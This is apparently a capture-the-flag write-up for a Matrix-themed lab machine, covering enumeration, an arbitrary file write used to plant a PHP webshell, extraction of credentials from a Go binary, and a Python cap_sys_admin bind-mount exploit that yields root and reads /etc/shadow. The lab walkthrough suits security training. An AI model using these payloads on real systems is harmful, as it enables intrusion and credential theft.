# Morpheus:1 — Full Writeup

**Target IP:** `10.10.10.91`
**Attacker IP:** `10.10.14.4`
**Difficulty:** Medium
**Flags:** 3

---

## Phase 1: Reconnaissance & Enumeration

### 1.1 VPN Connection

Connected to the lab environment using the provided OpenVPN configuration file:

```bash
openvpn zaara.ovpn
```

Verified connectivity:

```bash
ping -c 2 10.10.10.91
```

Our attack machine was assigned IP `10.10.14.4` on the `tun0` interface.

### 1.2 Port Scanning

Ran an initial Nmap scan with default scripts and version detection:

```bash
nmap -sC -sV -T4 10.10.10.91
```

**Results — 3 open ports:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22   | SSH     | OpenSSH 8.4p1 Debian | Standard SSH |
| 80   | HTTP    | Apache 2.4.51        | Title: "Morpheus:1" |
| 81   | HTTP    | nginx 1.18.0         | **401 Unauthorized** — Basic Auth realm: "Meeting Place" |

A full port scan (`nmap -p-`) confirmed no additional ports were open.

### 1.3 Web Enumeration — Port 80

**Homepage (`http://10.10.10.91/`):**

The page displayed a Matrix-themed message:

> *"Welcome to the Nebuchadnezzar. You play Trinity, a hacker on the ship. A computer on the ship has been locked by Cypher, a disgruntled crew member. Can you unlock the computer?"*

It also contained an image `trinity.jpeg` and mentioned the file `/.cypher-neo.png`.

**robots.txt:**

```
There's no white rabbit here. Keep searching!
```

**Directory Brute-Force:**

```bash
gobuster dir -u http://10.10.10.91/ -w /usr/share/dirb/wordlists/common.txt -t 30 -x php,txt,html,bak
```

Standard Apache files were found. Then, targeted probing for Matrix-themed filenames revealed two critical files:

```bash
# Manual probing
for path in graffiti graffiti.txt graffiti.php; do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://10.10.10.91/$path)
  echo "/$path -> HTTP $code"
done
```

```
/graffiti.txt -> HTTP 200
/graffiti.php -> HTTP 200
```

### 1.4 Web Enumeration — Port 81

Port 81 returned `401 Unauthorized` with Basic Authentication (realm: "Meeting Place"). Without valid credentials, all paths returned 401.

Brute-force attempts with common Matrix-themed username/password combinations failed:

```bash
for user in trinity morpheus neo cypher admin; do
  for pass in trinity morpheus neo cypher password admin matrix rabbit; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" http://10.10.10.91:81/)
    if [ "$code" != "401" ]; then
      echo "SUCCESS: $user:$pass -> HTTP $code"
    fi
  done
done
```

---

## Phase 2: Initial Foothold — Arbitrary File Write to RCE

### 2.1 Analyzing graffiti.php

**graffiti.txt** contained:

```
Mouse here - welcome to the Nebby!

Make sure not to tell Morpheus about this graffiti wall.
It's just here to let us blow off some steam.
```

**graffiti.php** displayed a "Graffiti Wall" web form. Examining the HTML source revealed a **hidden `file` parameter**:

```html
<form method="post">
  <textarea name="message" rows="4" cols="50"></textarea>
  <input type="hidden" name="file" value="graffiti.txt">
  <input type="submit" value="Post">
</form>
```

The PHP source code confirmed the vulnerability:

```php
<?php
$file = $_POST['file'] ?? 'graffiti.txt';
$message = $_POST['message'] ?? '';
if ($message) {
    $handle = fopen($file, 'a+');
    fwrite($handle, $message . "\n");
    fclose($handle);
}
// Display file contents...
?>
```

**Vulnerability:** The `file` parameter allows writing to **any file path** that `www-data` has write access to.

### 2.2 Writing a PHP Webshell

Exploited the arbitrary file write to create a webshell:

```bash
curl -s -X POST http://10.10.10.91/graffiti.php \
  -d 'message=<%3fphp+system($_GET["cmd"]);+%3f>&file=cmd.php'
```

This wrote `<?php system($_GET["cmd"]); ?>` to `/var/www/html/cmd.php`.

### 2.3 Verifying RCE

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**We have Remote Code Execution as `www-data`!**

---

## Phase 3: Enumeration as www-data

### 3.1 System Information

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=uname+-a"
```

```
Linux morpheus 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
```

### 3.2 Flag 1

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=cat+/FLAG.txt"
```

The flag contained critical hints:

1. **Cypher gave his password to Agent Smith** — the password is stored somewhere recoverable
2. **Hidden image** at `/.cypher-neo.png` on port 80
3. **nginx Basic Auth** on port 81 uses `.htpasswd` at `/var/nginx/html/.htpasswd`

### 3.3 Extracting the htpasswd Hash

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=cat+/var/nginx/html/.htpasswd"
```

```
cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0
```

This is an Apache MD5 (`$apr1$`) hash. Cracking attempts with `john` and `hashcat` using `rockyou.txt` and other large wordlists **failed** — the password was not in any common wordlist.

### 3.4 Users & Groups

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=cat+/etc/passwd+|+grep+sh"
```

```
root:x:0:0:root:/root:/bin/bash
trinity:x:1000:1000::/home/trinity:/bin/bash
cypher:x:1001:1001::/home/cypher:/bin/bash
```

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=grep+-E+'(docker|humans)'+/etc/group"
```

```
docker:x:999:
humans:x:1002:trinity,cypher
```

**Key finding:** Both `trinity` and `cypher` are in the `humans` group.

### 3.5 Linux Capabilities

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=getcap+-r+/+2>/dev/null"
```

```
/usr/bin/python3-9 cap_sys_admin=ep
```

**Critical finding:** `/usr/bin/python3-9` has `cap_sys_admin` (allows mounting filesystems).

However, checking its permissions:

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=ls+-la+/usr/bin/python3-9"
```

```
-rwxr-x--- 1 root humans 5765064 ... /usr/bin/python3-9
```

**Only root and members of the `humans` group can execute it.** We need to become `trinity` or `cypher` first.

### 3.6 Cron Jobs

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=cat+/etc/cron.d/fix-ownership-on-crew"
```

```
* * * * * root chown -R root /crew
```

A cron job runs every minute as root, changing ownership of everything in `/crew` to root. The `/crew` directory is owned by `root:humans` with group-write permissions.

### 3.7 Docker Container Discovery

Checking nginx access logs revealed a Docker container making periodic authenticated requests:

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=cat+/var/log/nginx/access.log"
```

```
172.17.0.2 - cypher [15/Feb/2026:...] "GET / HTTP/1.1" 200 ... "Go-http-client/1.1"
```

A container at `172.17.0.2` was authenticating as `cypher` to port 81 every ~60 seconds using a Go HTTP client.

---

## Phase 4: Credential Extraction from Docker Container

### 4.1 Accessing the Docker Overlay Filesystem

The webshell runs on the **host**, so we can access Docker's overlay filesystem:

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=ls+/var/lib/docker/overlay2/d13e48a56e3ab95baad2c1aef075980aecbd25b19ae91ef7edac46c7a944c08d/merged/"
```

```
bin  boot  dev  etc  home  lib  main.sh  ...
```

### 4.2 Finding the Authentication Script

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=cat+/var/lib/docker/overlay2/d13e48a56e3ab95baad2c1aef075980aecbd25b19ae91ef7edac46c7a944c08d/merged/main.sh"
```

```bash
#!/bin/bash
while :
do
   /usr/bin/basic-auth-client
   sleep 60
done
```

The container runs a Go binary `/usr/bin/basic-auth-client` in a loop.

### 4.3 Extracting Credentials from the Go Binary

Copied the binary to the webroot for download:

```bash
curl -s "http://10.10.10.91/cmd.php?cmd=cp+/var/lib/docker/overlay2/.../merged/usr/bin/basic-auth-client+/var/www/html/bac"
curl -s http://10.10.10.91/bac -o /tmp/bac
```

**Step 1: Find the global variables using `go tool nm`:**

```bash
go tool nm /tmp/bac | grep "main\."
```

```
82ed90 D main.password
82eda0 D main.username
```

**Step 2: Disassemble to understand the data layout using `go tool objdump`:**

```bash
go tool objdump /tmp/bac | grep -A 50 "TEXT main.main"
```

This confirmed the binary calls `SetBasicAuth(username, password)`.

**Step 3: Extract string pointers and lengths from the data section:**

```bash
objdump -s -j .noptrdata --start-address=0x82ed90 --stop-address=0x82edb0 /tmp/bac
```

```
82ed90 d2606600 00000000 2f000000 00000000  .`f...../......
82eda0 098d6500 00000000 06000000 00000000  ..e.............
```

Decoded:
- `main.password`: pointer = `0x6660d2`, length = `0x2f` (47 bytes)
- `main.username`: pointer = `0x658d09`, length = `0x06` (6 bytes)

**Step 4: Extract the actual string data:**

```bash
# Username (6 bytes at 0x658d09)
objdump -s -j .rodata --start-address=0x658d09 --stop-address=0x658d0f /tmp/bac
```

```
658d09 637970686572  cypher
```

```bash
# Password (47 bytes at 0x6660d2)
objdump -s -j .rodata --start-address=0x6660d2 --stop-address=0x666101 /tmp/bac
```

```
6660d2 63616368 652d7072 6f73792d 70726f63  cache-prosy-proc
6660e2 65656473 2d636c75 652d6578 70696174  eeds-clue-expiat
6660f2 652d616d 6d6f2d70 75676966 697374    e-ammo-pugilist
```

### 4.4 Recovered Credentials

| Field    | Value |
|----------|-------|
| Username | `cypher` |
| Password | `cache-prosy-proceeds-clue-expiate-ammo-pugilist` |

---

## Phase 5: SSH Access as Cypher — Flag 2

### 5.1 SSH Login

```python
import paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('10.10.10.91', username='cypher',
            password='cache-prosy-proceeds-clue-expiate-ammo-pugilist')
stdin, stdout, stderr = ssh.exec_command('id; groups')
print(stdout.read().decode())
```

```
uid=1001(cypher) gid=1001(cypher) groups=1001(cypher),1002(humans)
```

### 5.2 Flag 2

```bash
cat /home/cypher/FLAG.txt
```

Flag 2 was captured from cypher's home directory.

---

## Phase 6: Privilege Escalation — Root

### 6.1 Strategy

As `cypher` in the `humans` group, we can now execute `/usr/bin/python3-9` which has `cap_sys_admin=ep`. This capability allows **mounting filesystems**.

The plan:
1. Use `python3-9` to mount `/dev/sda1` to access the raw disk
2. Create a modified copy of `/etc/passwd` with cypher's UID changed to 0
3. Bind-mount the modified file over the real `/etc/passwd`
4. Use `su cypher` — PAM authenticates with cypher's password from `/etc/shadow`, but assigns **uid 0** per the modified `/etc/passwd`

### 6.2 Exploit — Bind Mount /etc/passwd

The exploit was executed via SSH as `cypher`:

```python
#!/usr/bin/env python3
# Executed with: /usr/bin/python3-9 exploit.py

import os
import ctypes
import shutil

libc = ctypes.CDLL("libc.so.6", use_errno=True)

# Step 1: Mount the root filesystem to access raw files
os.makedirs("/tmp/rootmount", exist_ok=True)
ret = libc.mount(b"/dev/sda1", b"/tmp/rootmount", b"ext4", 0, b"")
print(f"mount /dev/sda1 ret={ret}")

# Step 2: Copy /etc/passwd and modify cypher's UID to 0
original = open("/tmp/rootmount/etc/passwd").read()
modified = original.replace(
    "cypher:x:1001:1001::",
    "cypher:x:0:0::"
)

my_passwd = "/tmp/my_passwd"
with open(my_passwd, "w") as f:
    f.write(modified)

# Step 3: Bind-mount modified passwd over /etc/passwd
ret = libc.mount(
    my_passwd.encode(),
    b"/etc/passwd",
    None,
    4096,  # MS_BIND
    None
)
print(f"bind mount ret={ret}")

# Verify
print(open("/etc/passwd").readlines()[-5:])
```

Executed via SSH:

```bash
/usr/bin/python3-9 /tmp/exploit.py
```

```
mount /dev/sda1 ret=0
bind mount ret=0
```

### 6.3 Verification

After the bind mount, `/etc/passwd` showed:

```
cypher:x:0:0::/home/cypher:/bin/bash
```

### 6.4 Escalating to Root with `su`

Since SSH's `PermitRootLogin prohibit-password` blocked direct SSH login as uid 0, we used `su` through the webshell instead:

```bash
# Via the webshell (cmd.php)
echo "cache-prosy-proceeds-clue-expiate-ammo-pugilist" | su -c "id" cypher
```

```
uid=0(root) gid=0(root) groups=0(root)
```

**We are root!**

### 6.5 Flag 3 — Root Flag

```bash
echo "cache-prosy-proceeds-clue-expiate-ammo-pugilist" | su -c "cat /root/FLAG.txt" cypher
```

```
You've won! Let's hope Matrix: Resurrections rocks!
```

### 6.6 Root Shadow File

```bash
echo "cache-prosy-proceeds-clue-expiate-ammo-pugilist" | su -c "cat /etc/shadow" cypher
```

Full `/etc/shadow` was extracted confirming complete root access.

---

## Summary — Attack Chain

```
Port 80 (Apache)
    │
    ▼
graffiti.php — Hidden "file" parameter (arbitrary file write)
    │
    ▼
Write PHP webshell (cmd.php) → RCE as www-data
    │
    ▼
Enumerate system → Find Docker overlay filesystem
    │
    ▼
Read Go binary (basic-auth-client) from container overlay
    │
    ▼
Reverse engineer Go binary → Extract credentials
    │   Username: cypher
    │   Password: cache-prosy-proceeds-clue-expiate-ammo-pugilist
    │
    ▼
SSH as cypher (member of "humans" group) → Flag 2
    │
    ▼
Execute /usr/bin/python3-9 (cap_sys_admin=ep, restricted to "humans" group)
    │
    ▼
Mount /dev/sda1 → Copy & modify /etc/passwd (cypher uid → 0)
    │
    ▼
Bind-mount modified passwd over /etc/passwd
    │
    ▼
su cypher → uid=0(root) → Flag 3 🏆
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| cURL | Web requests, webshell interaction |
| Gobuster | Directory brute-forcing |
| Go tool objdump | Disassembling Go binary |
| objdump | Extracting string data from binary |
| go tool nm | Finding symbol addresses in Go binary |
| Paramiko (Python) | SSH client for automated access |
| John the Ripper | Hash cracking attempts |
| zsteg / binwalk | Image steganography analysis |

---

## Key Takeaways

1. **Never trust user input in file operations** — The `graffiti.php` file parameter allowed writing arbitrary files to the filesystem, leading to immediate RCE.

2. **Don't embed credentials in compiled binaries** — Go string literals are trivially extractable using standard tools like `go tool objdump`, `go tool nm`, and `objdump`. Always use environment variables, vaults, or config files with proper permissions.

3. **Linux capabilities are as dangerous as SUID** — `cap_sys_admin` on Python allowed mounting filesystems and modifying critical system files like `/etc/passwd`. Capabilities should be audited regularly.

4. **Docker overlay filesystems expose container secrets** — If an attacker has host access (even as an unprivileged user), Docker container contents may be readable through the overlay2 storage driver paths.

5. **Defense in depth matters** — Multiple security layers (SSH key-only auth, proper file permissions, no unnecessary capabilities, container isolation) would have prevented this attack chain at several points.
